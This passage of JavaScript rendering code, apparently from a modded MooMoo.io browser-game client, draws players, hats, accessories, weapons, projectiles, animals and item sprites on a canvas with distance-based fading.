            tmpObj.fadeAlpha - fadeSpeed,
          );
          fadeAlpha = tmpObj.fadeAlpha;
        } else {
          tmpObj.fadeAlpha = Math.min(1, tmpObj.fadeAlpha + fadeSpeed);
          fadeAlpha = tmpObj.fadeAlpha;
        }

        if (fadeAlpha <= 0) continue;

        var targetDir = tmpObj == player ? getVisualDir() : tmpObj.dir || 0;

        if (tmpObj.smoothDir === undefined) {
          tmpObj.smoothDir = targetDir;
          tmpObj.smoothDirVelocity = 0;
        }

        var smoothingFactor = tmpObj == player && AB.Menu.AutoSpin ? 1 : 0.1;
        var angleDifference = normalizeAngle(targetDir - tmpObj.smoothDir);

        tmpObj.smoothDir += angleDifference * smoothingFactor;

        tmpObj.smoothDir = normalizeAngle(tmpObj.smoothDir);

        tmpDir = tmpObj.smoothDir;

        mainContext.save();
        mainContext.translate(tmpObj.x - xOffset, tmpObj.y - yOffset);
        mainContext.rotate(tmpDir + tmpObj.dirPlus);
        mainContext.globalAlpha *= fadeAlpha;

        renderPlayer(tmpObj, mainContext);
        mainContext.restore();
      }
    }
  }
}

function renderDeadPlayer(obj, ctxt) {
  ctxt = ctxt || mainContext;
  ctxt.lineWidth = outlineWidth;
  ctxt.lineJoin = "miter";

  let handAngle = (Math.PI / 4) * (items.weapons[obj.weaponIndex].armS || 1);
  let oHandAngle =
    obj.buildIndex < 0 ? items.weapons[obj.weaponIndex].hndS || 1 : 1;
  let oHandDist =
    obj.buildIndex < 0 ? items.weapons[obj.weaponIndex].hndD || 1 : 1;
  if (obj.tailIndex !== undefined && obj.tailIndex > 0) {
    renderTail2(obj.tailIndex, ctxt, obj);
  }
  if (obj.buildIndex < 0 && !items.weapons[obj.weaponIndex].aboveHand) {
    renderTool(
      items.weapons[obj.weaponIndex],
      config.weaponVariants[obj.weaponVariant || 0].src || "",
      obj.scale,
      0,
      ctxt,
    );
    if (
      items.weapons[obj.weaponIndex].projectile != undefined &&
      !items.weapons[obj.weaponIndex].hideProjectile
    ) {
      renderProjectile(
        obj.scale,
        0,
        items.projectiles[items.weapons[obj.weaponIndex].projectile],
        mainContext,
      );
    }
  }
  ctxt.fillStyle = "#000000";
  renderCircle(
    obj.scale * Math.cos(handAngle),
    obj.scale * Math.sin(handAngle),
    14,
  );
  renderCircle(
    obj.scale * oHandDist * Math.cos(-handAngle * oHandAngle),
    obj.scale * oHandDist * Math.sin(-handAngle * oHandAngle),
    14,
  );
  if (obj.buildIndex < 0 && items.weapons[obj.weaponIndex].aboveHand) {
    renderTool(
      items.weapons[obj.weaponIndex],
      config.weaponVariants[obj.weaponVariant || 0].src || "",
      obj.scale,
      0,
      ctxt,
    );
    if (
      items.weapons[obj.weaponIndex].projectile != undefined &&
      !items.weapons[obj.weaponIndex].hideProjectile
    ) {
      renderProjectile(
        obj.scale,
        0,
        items.projectiles[items.weapons[obj.weaponIndex].projectile],
        mainContext,
      );
    }
  }
  if (obj.buildIndex >= 0) {
    var tmpSprite = getItemSprite(items.list[obj.buildIndex]);
    ctxt.drawImage(
      tmpSprite,
      obj.scale - items.list[obj.buildIndex].holdOffset,
      -tmpSprite.width / 2,
    );
  }
  renderCircle(0, 0, obj.scale, ctxt);
  ctxt.save();
  ctxt.rotate(Math.PI / 2);
  if (obj.skinIndex !== undefined && obj.skinIndex > 0) {
    renderSkin2(obj.skinIndex, ctxt, null, obj);
  } else {
    renderSkin2(6, ctxt, null, obj);
  }
  ctxt.restore();
}

function normalizeAngle(angle) {
  while (angle > Math.PI) angle -= Math.PI * 2;
  while (angle < -Math.PI) angle += Math.PI * 2;
  return angle;
}

function renderPlayer(obj, ctxt) {
  ctxt = ctxt || mainContext;
  ctxt.lineWidth = outlineWidth;
  ctxt.lineJoin = "miter";
  let handAngle = (Math.PI / 4) * (items.weapons[obj.weaponIndex].armS || 1);
  let oHandAngle =
    obj.buildIndex < 0 ? items.weapons[obj.weaponIndex].hndS || 1 : 1;
  let oHandDist =
    obj.buildIndex < 0 ? items.weapons[obj.weaponIndex].hndD || 1 : 1;

  let katanaMusket =
    obj == player && obj.weapons[0] == 3 && obj.weapons[1] == 15;

  if (obj.tailIndex > 0) {
    renderTailTextureImage(obj.tailIndex, ctxt, obj);
  }

  if (obj.buildIndex < 0 && !items.weapons[obj.weaponIndex].aboveHand) {
    renderTool(
      items.weapons[katanaMusket ? 4 : obj.weaponIndex],
      config.weaponVariants[obj.weaponVariant].src,
      obj.scale,
      0,
      ctxt,
    );
    if (
      items.weapons[obj.weaponIndex].projectile != undefined &&
      !items.weapons[obj.weaponIndex].hideProjectile
    ) {
      renderProjectile(
        obj.scale,
        0,
        items.projectiles[items.weapons[obj.weaponIndex].projectile],
        mainContext,
      );
    }
  }

  ctxt.fillStyle = config.skinColors[obj.skinColor];
  renderCircle(
    obj.scale * Math.cos(handAngle),
    obj.scale * Math.sin(handAngle),
    14,
  );
  renderCircle(
    obj.scale * oHandDist * Math.cos(-handAngle * oHandAngle),
    obj.scale * oHandDist * Math.sin(-handAngle * oHandAngle),
    14,
  );

  if (obj.buildIndex < 0 && items.weapons[obj.weaponIndex].aboveHand) {
    renderTool(
      items.weapons[obj.weaponIndex],
      config.weaponVariants[obj.weaponVariant].src,
      obj.scale,
      0,
      ctxt,
    );
    if (
      items.weapons[obj.weaponIndex].projectile != undefined &&
      !items.weapons[obj.weaponIndex].hideProjectile
    ) {
      renderProjectile(
        obj.scale,
        0,
        items.projectiles[items.weapons[obj.weaponIndex].projectile],
        mainContext,
      );
    }
  }

  if (obj.buildIndex >= 0) {
    var tmpSprite = getItemSprite(items.list[obj.buildIndex]);
    ctxt.drawImage(
      tmpSprite,
      obj.scale - items.list[obj.buildIndex].holdOffset,
      -tmpSprite.width / 2,
    );
  }

  renderCircle(0, 0, obj.scale, ctxt);

  if (obj.skinIndex > 0) {
    ctxt.rotate(Math.PI / 2);
    renderTextureSkin(obj.skinIndex, ctxt, null, obj);
  }
}

var skinSprites2 = {};
var skinPointers2 = {};
function renderSkin2(index, ctxt, parentSkin, owner) {
  tmpSkin = skinSprites2[index];
  if (!tmpSkin) {
    var tmpImage = new Image();
    tmpImage.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    tmpImage.src = "https://moomoo.io/img/hats/hat_" + index + ".png";
    skinSprites2[index] = tmpImage;
    tmpSkin = tmpImage;
  }
  var tmpObj = parentSkin || skinPointers2[index];
  if (!tmpObj) {
    for (var i = 0; i < hats.length; ++i) {
      if (hats[i].id == index) {
        tmpObj = hats[i];
        break;
      }
    }
    skinPointers2[index] = tmpObj;
  }
  if (tmpSkin.isLoaded) {
    ctxt.drawImage(
      tmpSkin,
      -tmpObj.scale / 2,
      -tmpObj.scale / 2,
      tmpObj.scale,
      tmpObj.scale,
    );
  }
  if (!parentSkin && tmpObj.topSprite) {
    ctxt.save();
    ctxt.rotate(owner.skinRot);
    renderSkin2(index + "_top", ctxt, tmpObj, owner);
    ctxt.restore();
  }
}

function renderTextureSkin(index, ctxt, parentSkin, owner) {
  if (!(tmpSkin = skinSprites[index + (txt ? "lol" : 0)])) {
    var tmpImage = new Image();
    tmpImage.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    tmpImage.src = setSkinTextureImage(index, "hat", index);
    skinSprites[index + (txt ? "lol" : 0)] = tmpImage;
    tmpSkin = tmpImage;
  }
  var tmpObj = parentSkin || skinPointers[index];
  if (!tmpObj) {
    for (var i = 0; i < hats.length; ++i) {
      if (hats[i].id == index) {
        tmpObj = hats[i];
        break;
      }
    }
    skinPointers[index] = tmpObj;
  }
  if (tmpSkin.isLoaded) {
    ctxt.drawImage(
      tmpSkin,
      -tmpObj.scale / 2,
      -tmpObj.scale / 2,
      tmpObj.scale,
      tmpObj.scale,
    );
  }
  if (!parentSkin && tmpObj.topSprite) {
    ctxt.save();
    ctxt.rotate(owner.skinRot);
    renderSkin(index + "_top", ctxt, tmpObj, owner);
    ctxt.restore();
  }
}

function setSkinTextureImage(id, type, id2) {
  if (true) {
    if (type == "acc") {
      return ".././img/accessories/access_" + id + ".png";
    } else if (type == "hat") {
      return ".././img/hats/hat_" + id + ".png";
    } else {
      return ".././img/weapons/" + id + ".png";
    }
  }
}

let skinSprites = {};
let skinPointers = {};
let tmpSkin;

function renderSkin(index, ctxt, parentSkin, owner) {
  tmpSkin = skinSprites[index];
  if (!tmpSkin) {
    let tmpImage = new Image();
    tmpImage.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    tmpImage.src = "https://moomoo.io/img/hats/hat_" + index + ".png";
    skinSprites[index] = tmpImage;
    tmpSkin = tmpImage;
  }
  let tmpObj = parentSkin || skinPointers[index];
  if (!tmpObj) {
    for (let i = 0; i < hats.length; ++i) {
      if (hats[i].id == index) {
        tmpObj = hats[i];
        break;
      }
    }
    skinPointers[index] = tmpObj;
  }
  if (tmpSkin.isLoaded)
    ctxt.drawImage(
      tmpSkin,
      -tmpObj.scale / 2,
      -tmpObj.scale / 2,
      tmpObj.scale,
      tmpObj.scale,
    );
  if (!parentSkin && tmpObj.topSprite) {
    ctxt.save();
    ctxt.rotate(owner.skinRot);
    renderSkin(index + "_top", ctxt, tmpObj, owner);
    ctxt.restore();
  }
}

function setTailTextureImage(id, type, id2) {
  if (true) {
    if (type == "acc") {
      return ".././img/accessories/access_" + id + ".png";
    } else if (type == "hat") {
      return ".././img/hats/hat_" + id + ".png";
    } else {
      return ".././img/weapons/" + id + ".png";
    }
  } else {
    if (type == "acc") {
      return ".././img/accessories/access_" + id + ".png";
    } else if (type == "hat") {
      return ".././img/hats/hat_" + id + ".png";
    } else {
      return ".././img/weapons/" + id + ".png";
    }
  }
}
function renderTailTextureImage(index, ctxt, owner) {
  if (!(tmpSkin = accessSprites[index + (txt ? "lol" : 0)])) {
    var tmpImage = new Image();
    ((tmpImage.onload = function () {
      ((this.isLoaded = true), (this.onload = null));
    }),
      (tmpImage.src = setTailTextureImage(index, "acc")),
      (accessSprites[index + (txt ? "lol" : 0)] = tmpImage),
      (tmpSkin = tmpImage));
  }
  var tmpObj = accessPointers[index];
  if (!tmpObj) {
    for (var i = 0; i < accessories.length; ++i) {
      if (accessories[i].id == index) {
        tmpObj = accessories[i];
        break;
      }
    }
    accessPointers[index] = tmpObj;
  }
  if (tmpSkin.isLoaded) {
    ctxt.save();
    ctxt.translate(-20 - (tmpObj.xOff || 0), 0);
    if (tmpObj.spin) {
      ctxt.rotate(owner.skinRot);
    }
    ctxt.drawImage(
      tmpSkin,
      -(tmpObj.scale / 2),
      -(tmpObj.scale / 2),
      tmpObj.scale,
      tmpObj.scale,
    );
    ctxt.restore();
  }
}

let accessSprites = {};
let accessPointers = {};
var txt = true;

function renderTail(index, ctxt, owner) {
  tmpSkin = accessSprites[index];
  if (!tmpSkin) {
    let tmpImage = new Image();
    tmpImage.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    tmpImage.src = "https://moomoo.io/img/accessories/access_" + index + ".png";
    accessSprites[index] = tmpImage;
    tmpSkin = tmpImage;
  }
  let tmpObj = accessPointers[index];
  if (!tmpObj) {
    for (let i = 0; i < accessories.length; ++i) {
      if (accessories[i].id == index) {
        tmpObj = accessories[i];
        break;
      }
    }
    accessPointers[index] = tmpObj;
  }
  if (tmpSkin.isLoaded) {
    ctxt.save();
    ctxt.translate(-20 - (tmpObj.xOff || 0), 0);
    if (tmpObj.spin) {
      ctxt.rotate(owner.skinRot);
    }
    ctxt.drawImage(
      tmpSkin,
      -(tmpObj.scale / 2),
      -(tmpObj.scale / 2),
      tmpObj.scale,
      tmpObj.scale,
    );
    ctxt.restore();
  }
}

var accessSprites2 = {};
var accessPointers2 = {};
function renderTail2(index, ctxt, owner) {
  tmpSkin = accessSprites2[index];
  if (!tmpSkin) {
    var tmpImage = new Image();
    tmpImage.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    tmpImage.src = "https://moomoo.io/img/accessories/access_" + index + ".png";
    accessSprites2[index] = tmpImage;
    tmpSkin = tmpImage;
  }
  var tmpObj = accessPointers2[index];
  if (!tmpObj) {
    for (var i = 0; i < accessories.length; ++i) {
      if (accessories[i].id == index) {
        tmpObj = accessories[i];
        break;
      }
    }
    accessPointers2[index] = tmpObj;
  }
  if (tmpSkin.isLoaded) {
    ctxt.save();
    ctxt.translate(-20 - (tmpObj.xOff || 0), 0);
    if (tmpObj.spin) {
      ctxt.rotate(owner.skinRot);
    }
    ctxt.drawImage(
      tmpSkin,
      -(tmpObj.scale / 2),
      -(tmpObj.scale / 2),
      tmpObj.scale,
      tmpObj.scale,
    );
    ctxt.restore();
  }
}

let toolSprites = {};
function renderTool(obj, variant, x, y, ctxt) {
  let tmpSrc = obj.src + (variant || "");
  let tmpSprite = toolSprites[tmpSrc];
  if (!tmpSprite) {
    tmpSprite = new Image();
    tmpSprite.onload = function () {
      this.isLoaded = true;
    };
    tmpSprite.src = "https://moomoo.io/img/weapons/" + tmpSrc + ".png";
    toolSprites[tmpSrc] = tmpSprite;
  }
  if (tmpSprite.isLoaded)
    ctxt.drawImage(
      tmpSprite,
      x + obj.xOff - obj.length / 2,
      y + obj.yOff - obj.width / 2,
      obj.length,
      obj.width,
    );
}

function renderProjectiles(layer, xOffset, yOffset) {
  const rendered = new Set();
  for (let i = 0; i < projectiles.length; i++) {
    tmpObj = projectiles[i];
    const key = `${tmpObj.x}_${tmpObj.y}_${tmpObj.dir}_${tmpObj.indx}`;
    if (
      !rendered.has(key) &&
      tmpObj.active &&
      tmpObj.layer == layer &&
      tmpObj.inWindow
    ) {
      tmpObj.update(delta);
      if (tmpObj.active) {
        const projX = tmpObj.x - xOffset;
        const projY = tmpObj.y - yOffset;
        const baseDistance = Math.min(screenWidth, screenHeight) * 1.5;
        const dynamicRenderDistance = baseDistance * wbe;
        const distanceSquared =
          (projX - screenWidth / 2) ** 2 + (projY - screenHeight / 2) ** 2;
        const distance = Math.sqrt(distanceSquared);

        const fadeSpeed = 1 / 30;
        let fadeAlpha = 1;

        if (tmpObj.fadeAlpha === undefined) tmpObj.fadeAlpha = 0;

        if (distance > dynamicRenderDistance) {
          tmpObj.fadeAlpha = 0;
          return;
        } else if (distance > dynamicRenderDistance - 200) {
          const fadeProgress = Math.max(
            0,
            (distance - (dynamicRenderDistance - 200)) / 200,
          );
          const targetAlpha = Math.max(0, 1 - fadeProgress);
          tmpObj.fadeAlpha = Math.max(
            targetAlpha,
            tmpObj.fadeAlpha - fadeSpeed,
          );
          fadeAlpha = tmpObj.fadeAlpha;
        } else {
          tmpObj.fadeAlpha = Math.min(1, tmpObj.fadeAlpha + fadeSpeed);
          fadeAlpha = tmpObj.fadeAlpha;
        }

        if (fadeAlpha <= 0) return;

        mainContext.save();
        mainContext.translate(tmpObj.x - xOffset, tmpObj.y - yOffset);
        mainContext.rotate(tmpObj.dir);
        mainContext.globalAlpha *= fadeAlpha;
        renderProjectile(0, 0, tmpObj, mainContext, 1);
        mainContext.restore();
        rendered.add(key);
      }
    }
  }
}

let projectileSprites = {};

function renderProjectile(x, y, obj, ctxt, debug) {
  if (obj.src) {
    let tmpSrc = items.projectiles[obj.indx].src;
    let tmpSprite = projectileSprites[tmpSrc];
    if (!tmpSprite) {
      tmpSprite = new Image();
      tmpSprite.onload = function () {
        this.isLoaded = true;
      };
      tmpSprite.src = "https://moomoo.io/img/weapons/" + tmpSrc + ".png";
      projectileSprites[tmpSrc] = tmpSprite;
    }
    if (tmpSprite.isLoaded)
      ctxt.drawImage(
        tmpSprite,
        x - obj.scale / 2,
        y - obj.scale / 2,
        obj.scale,
        obj.scale,
      );
  } else if (obj.indx == 1) {
    ctxt.fillStyle = "#939393";
    renderCircle(x, y, obj.scale, ctxt);
  }
}

let aiSprites = {};

function renderAI(obj, ctxt) {
  let tmpIndx = obj.index;
  let tmpSprite = aiSprites[tmpIndx];
  if (!tmpSprite) {
    let tmpImg = new Image();
    tmpImg.onload = function () {
      this.isLoaded = true;
      this.onload = null;
    };
    tmpImg.src = "https://moomoo.io/img/animals/" + obj.src + ".png";
    tmpSprite = tmpImg;
    aiSprites[tmpIndx] = tmpSprite;
  }
  if (tmpSprite.isLoaded) {
    let tmpScale = obj.scale * 1.2 * (obj.spriteMlt || 1);
    ctxt.drawImage(tmpSprite, -tmpScale, -tmpScale, tmpScale * 2, tmpScale * 2);
  }
}

function renderWaterBodies(xOffset, yOffset, ctxt, padding) {
  let tmpW = config.riverWidth + padding;
  let tmpY = config.mapScale / 2 - yOffset - tmpW / 2;
  if (tmpY < maxScreenHeight && tmpY + tmpW > 0) {
    ctxt.fillRect(0, tmpY, maxScreenWidth, tmpW);
  }
}

let gameObjectSprites = {};

function getResSprite(obj) {
  let biomeID =
    obj.y >= config.mapScale - config.snowBiomeTop
      ? 2
      : obj.y <= config.snowBiomeTop
        ? 1
        : 0;

  let tmpIndex = obj.type + "_" + obj.scale + "_" + biomeID;
  if (gameObjectSprites[tmpIndex]) return gameObjectSprites[tmpIndex];

  let c = document.createElement("canvas");
  c.width = c.height = obj.scale * 2.1 + outlineWidth;
  let ctx = c.getContext("2d");

  ctx.translate(c.width / 2, c.height / 2);
  ctx.rotate(UTILS.randFloat(0, Math.PI));
  ctx.strokeStyle = outlineColor;
  ctx.lineWidth = outlineWidth;

  if (obj.type == 0) {
    renderStar(ctx, 5, obj.scale, obj.scale * 0.7);
    ctx.fillStyle = biomeID ? "#e3f1f4" : "#9ebf57";
    ctx.fill();
    ctx.stroke();

    ctx.globalAlpha = 0.5;
    renderStar(ctx, 5, obj.scale * 0.82, obj.scale * 0.55);
    ctx.fillStyle = biomeID ? "#cfe3e7" : "#7f9f4a";
    ctx.fill();
    ctx.globalAlpha = 1;
  } else if (obj.type == 1) {
    if (biomeID == 2) {
      ctx.fillStyle = "#606060";
      renderStar(ctx, 6, obj.scale * 0.3, obj.scale * 0.71);
      ctx.fill();
      ctx.stroke();

      ctx.fillStyle = "#89a54c";
      renderCircle(0, 0, obj.scale * 0.55, ctx);
      ctx.fill();

      ctx.fillStyle = "#a5c65b";
      renderCircle(0, 0, obj.scale * 0.3, ctx, true);
    } else {
      renderBlob(ctx, 6, obj.scale, obj.scale * 0.7);
      ctx.fillStyle = biomeID ? "#e3f1f4" : "#89a54c";
      ctx.fill();
      ctx.stroke();

      ctx.globalAlpha = 0.5;
      renderBlob(ctx, 6, obj.scale * 0.75, obj.scale * 0.5);
      ctx.fillStyle = biomeID ? "#cfe3e7" : "#739343";
      ctx.fill();
      ctx.globalAlpha = 1;

      let berries = 4;
      let rot = (Math.PI * 2) / berries;
      ctx.fillStyle = biomeID ? "#e65b5b" : "#ff6f61";

      for (let i = 0; i < berries; i++) {
        let r = UTILS.randInt(obj.scale / 3.5, obj.scale / 2.3);
        ctx.beginPath();
        ctx.arc(
          Math.cos(rot * i) * r,
          Math.sin(rot * i) * r,
          UTILS.randInt(9, 11),
          0,
          Math.PI * 2,
        );
        ctx.fill();
      }
    }
  } else if (obj.type == 2 || obj.type == 3) {
    let base =
      obj.type == 2 ? (biomeID == 2 ? "#938d77" : "#939393") : "#e0c655";

    let inner =
      obj.type == 2 ? (biomeID == 2 ? "#b2ab90" : "#bcbcbc") : "#ebdca3";

    ctx.save();
    ctx.translate(0, 3);
    renderStar(ctx, 3, obj.scale, obj.scale);
    ctx.fillStyle = obj.type == 2 ? "#7f7f7f" : "#c9ad3f";
    ctx.fill();
    ctx.restore();

    renderStar(ctx, 3, obj.scale, obj.scale);
    ctx.fillStyle = base;
    ctx.fill();
    ctx.stroke();

    ctx.globalAlpha = 0.5;
    renderStar(ctx, 3, obj.scale * 0.6, obj.scale * 0.6);
    ctx.fillStyle = inner;
    ctx.fill();
    ctx.globalAlpha = 1;
  }

  gameObjectSprites[tmpIndex] = c;
  return c;
}

let itemSprites = [];
function getItemSprite(obj, asIcon) {
  let tmpSprite = itemSprites[obj.id];
  if (!tmpSprite || asIcon) {
    let tmpCanvas = document.createElement("canvas");
    let reScale =
      !asIcon && obj.name == "windmill" ? items.list[4].scale : obj.scale;
    tmpCanvas.width = tmpCanvas.height =
      reScale * 2.5 + outlineWidth + (items.list[obj.id].spritePadding || 0);
    if (config.useWebGl) {
      let gl = tmpCanvas.getContext("webgl");
      gl.clearColor(0, 0, 0, 0);
      gl.clear(gl.COLOR_BUFFER_BIT);

      let buffer = gl.createBuffer();
      gl.bindBuffer(gl.ARRAY_BUFFER, buffer);

      function render(vs, fs, vertice, type) {
        let vShader = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vShader, vs);
        gl.compileShader(vShader);
        gl.getShaderParameter(vShader, gl.COMPILE_STATUS);

        let fShader = gl.createShader(gl.FRAGMENT_SHADER);
        gl.shaderSource(fShader, fs);
        gl.compileShader(fShader);
        gl.getShaderParameter(fShader, gl.COMPILE_STATUS);

        let program = gl.createProgram();
        gl.attachShader(program, vShader);
        gl.attachShader(program, fShader);
        gl.linkProgram(program);
        gl.getProgramParameter(program, gl.LINK_STATUS);
        gl.useProgram(program);

        let vertex = gl.getAttribLocation(program, "vertex");
        gl.enableVertexAttribArray(vertex);
        gl.vertexAttribPointer(vertex, 2, gl.FLOAT, false, 0, 0);

        let vertices = vertice.length / 2;
        gl.bufferData(
          gl.ARRAY_BUFFER,
          new Float32Array(vertice),
          gl.DYNAMIC_DRAW,
        );
        gl.drawArrays(type, 0, vertices);
      }

      function hexToRgb(hex) {
        return hex
          .slice(1)
          .match(/.{1,2}/g)
          .map((g) => parseInt(g, 16));
      }

      function getRgb(r, g, b) {
        return [r / 255, g / 255, b / 255].join(", ");
      }

      let max = 100;
      for (let i = 0; i < max; i++) {
        let radian = Math.PI * (i / (max / 2));
        render(
          `
                            precision mediump float;
                            attribute vec2 vertex;
                            void main(void) {
                                gl_Position = vec4(vertex, 0, 1);
                            }
                            `,
          `
                            precision mediump float;
                            void main(void) {
                                gl_FragColor = vec4(${getRgb(...hexToRgb("#fff"))}, 1);
                            }
                            `,
          [0 + Math.cos(radian) * 0.5, 0 + Math.sin(radian) * 0.5, 0, 0],
          gl.LINE_LOOP,
        );
      }
    } else {
      let tmpContext = tmpCanvas.getContext("2d");
      tmpContext.translate(tmpCanvas.width / 2, tmpCanvas.height / 2);
      tmpContext.rotate(asIcon ? 0 : Math.PI / 2);
      tmpContext.strokeStyle = outlineColor;
      tmpContext.lineWidth = outlineWidth * (asIcon ? tmpCanvas.width / 81 : 1);
      if (!asIcon) {
        tmpContext.shadowColor = `rgba(0, 0, 0, ${Math.min(obj.name == "pit trap" ? 0.8 : 0.5, obj.alpha)})`;
      }

      if (obj.name == "apple") {
        tmpContext.fillStyle = "#c15555";
        renderCircle(0, 0, obj.scale, tmpContext);
        tmpContext.fillStyle = "#89a54c";
        let leafDir = -(Math.PI / 2);
        renderLeaf(
          obj.scale * Math.cos(leafDir),
          obj.scale * Math.sin(leafDir),
          25,
          leafDir + Math.PI / 2,
          tmpContext,
        );
      } else if (obj.name == "cookie") {
        tmpContext.fillStyle = "#cca861";
        renderCircle(0, 0, obj.scale, tmpContext);
        tmpContext.fillStyle = "#937c4b";
        let chips = 4;
        let rotVal = (Math.PI * 2) / chips;
        let tmpRange;
        for (let i = 0; i < chips; ++i) {
          tmpRange = UTILS.randInt(obj.scale / 2.5, obj.scale / 1.7);
          renderCircle(
            tmpRange * Math.cos(rotVal * i),
            tmpRange * Math.sin(rotVal * i),
            UTILS.randInt(4, 5),
            tmpContext,
            true,
          );
        }
      } else if (obj.name == "cheese") {
        tmpContext.fillStyle = "#f4f3ac";
        renderCircle(0, 0, obj.scale, tmpContext);
        tmpContext.fillStyle = "#c3c28b";
        let chips = 4;
        let rotVal = (Math.PI * 2) / chips;
        let tmpRange;
        for (let i = 0; i < chips; ++i) {
          tmpRange = UTILS.randInt(obj.scale / 2.5, obj.scale / 1.7);
          renderCircle(
            tmpRange * Math.cos(rotVal * i),
            tmpRange * Math.sin(rotVal * i),
            UTILS.randInt(4, 5),
            tmpContext,
            true,
          );
        }
      } else if (
        obj.name == "wood wall" ||
        obj.name == "stone wall" ||
        obj.name == "castle wall"
      ) {
        tmpContext.fillStyle =
          obj.name == "castle wall"
            ? "#83898e"
            : obj.name == "wood wall"
              ? "#a5974c"
              : "#939393";
        let sides = obj.name == "castle wall" ? 4 : 3;
        renderStar(tmpContext, sides, obj.scale * 1.1, obj.scale * 1.1);
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.fillStyle =
          obj.name == "castle wall"
            ? "#9da4aa"
            : obj.name == "wood wall"
              ? "#c9b758"
              : "#bcbcbc";
        renderStar(tmpContext, sides, obj.scale * 0.65, obj.scale * 0.65);
        tmpContext.fill();
      } else if (
        obj.name == "spikes" ||
        obj.name == "greater spikes" ||
        obj.name == "poison spikes" ||
        obj.name == "spinning spikes"
      ) {
        tmpContext.fillStyle =
          obj.name == "poison spikes" ? "#7b935d" : "#939393";
        let tmpScale = obj.scale * 0.6;
        renderStar(
          tmpContext,
          obj.name == "spikes" ? 5 : 6,
          obj.scale,
          tmpScale,
        );
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.fillStyle = "#a5974c";
        renderCircle(0, 0, tmpScale, tmpContext);
        tmpContext.fillStyle = "#c9b758";
        renderCircle(0, 0, tmpScale / 2, tmpContext, true);
      } else if (
        obj.name == "windmill" ||
        obj.name == "faster windmill" ||
        obj.name == "power mill"
      ) {
        tmpContext.fillStyle = "#a5974c";
        renderCircle(0, 0, reScale, tmpContext);
        tmpContext.fillStyle = "#c9b758";
        renderRectCircle(0, 0, reScale * 1.5, 29, 4, tmpContext);
        tmpContext.fillStyle = "#a5974c";
        renderCircle(0, 0, reScale * 0.5, tmpContext);
      } else if (obj.name == "mine") {
        tmpContext.fillStyle = "#939393";
        renderStar(tmpContext, 3, obj.scale, obj.scale);
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.fillStyle = "#bcbcbc";
        renderStar(tmpContext, 3, obj.scale * 0.55, obj.scale * 0.65);
        tmpContext.fill();
      } else if (obj.name == "sapling") {
        for (let i = 0; i < 2; ++i) {
          let tmpScale = obj.scale * (!i ? 1 : 0.5);
          renderStar(tmpContext, 7, tmpScale, tmpScale * 0.7);
          tmpContext.fillStyle = !i ? "#9ebf57" : "#b4db62";
          tmpContext.fill();
          if (!i) tmpContext.stroke();
        }
      } else if (obj.name == "pit trap") {
        tmpContext.fillStyle = "#a5974c";
        renderStar(tmpContext, 3, obj.scale * 1.1, obj.scale * 1.1);
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.fillStyle = outlineColor;
        renderStar(tmpContext, 3, obj.scale * 0.65, obj.scale * 0.65);
        tmpContext.fill();
      } else if (obj.name == "boost pad") {
        tmpContext.fillStyle = "#7e7f82";
        renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.fillStyle = "#dbd97d";
        renderTriangle(obj.scale * 1, tmpContext);
      } else if (obj.name == "turret") {
        tmpContext.fillStyle = "#a5974c";
        renderCircle(0, 0, obj.scale, tmpContext);
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.fillStyle = "#939393";
        let tmpLen = 50;
        renderRect(0, -tmpLen / 2, obj.scale * 0.9, tmpLen, tmpContext);
        renderCircle(0, 0, obj.scale * 0.6, tmpContext);
        tmpContext.fill();
        tmpContext.stroke();
      } else if (obj.name == "platform") {
        tmpContext.fillStyle = "#cebd5f";
        let tmpCount = 4;
        let tmpS = obj.scale * 2;
        let tmpW = tmpS / tmpCount;
        let tmpX = -(obj.scale / 2);
        for (let i = 0; i < tmpCount; ++i) {
          renderRect(tmpX - tmpW / 2, 0, tmpW, obj.scale * 2, tmpContext);
          tmpContext.fill();
          tmpContext.stroke();
          tmpX += tmpS / tmpCount;
        }
      } else if (obj.name == "healing pad") {
        tmpContext.fillStyle = "#7e7f82";
        renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.fillStyle = "#db6e6e";
        renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
      } else if (obj.name == "spawn pad") {
        tmpContext.fillStyle = "#7e7f82";
        renderRect(0, 0, obj.scale * 2, obj.scale * 2, tmpContext);
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.fillStyle = "#71aad6";
        renderCircle(0, 0, obj.scale * 0.6, tmpContext);
      } else if (obj.name == "blocker") {
        tmpContext.fillStyle = "#7e7f82";
        renderCircle(0, 0, obj.scale, tmpContext);
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.rotate(Math.PI / 4);
        tmpContext.fillStyle = "#db6e6e";
        renderRectCircle(0, 0, obj.scale * 0.65, 20, 4, tmpContext, true);
      } else if (obj.name == "teleporter") {
        tmpContext.fillStyle = "#7e7f82";
        renderCircle(0, 0, obj.scale, tmpContext);
        tmpContext.fill();
        tmpContext.stroke();
        tmpContext.rotate(Math.PI / 4);
        tmpContext.fillStyle = "#d76edb";
        renderCircle(0, 0, obj.scale * 0.5, tmpContext, true);
      }
    }
    tmpSprite = tmpCanvas;
    if (!asIcon) {
      itemSprites[obj.id] = tmpSprite;
    }
  }
  return tmpSprite;
}

function getItemSprite2(obj, tmpX, tmpY) {
  let tmpContext = mainContext;
  let reScale = obj.name == "windmill" ? items.list[4].scale : obj.scale;
  tmpContext.save();
  tmpContext.translate(tmpX, tmpY);
  tmpContext.rotate(obj.dir);
  tmpContext.strokeStyle = outlineColor;
  tmpContext.lineWidth = outlineWidth;
  if (obj.name == "apple") {
    tmpContext.fillStyle = "#c15555";
    renderCircle(0, 0, obj.scale, tmpContext);
    tmpContext.fillStyle = "#89a54c";
    let leafDir = -(Math.PI / 2);
    renderLeaf(
      obj.scale * Math.cos(leafDir),
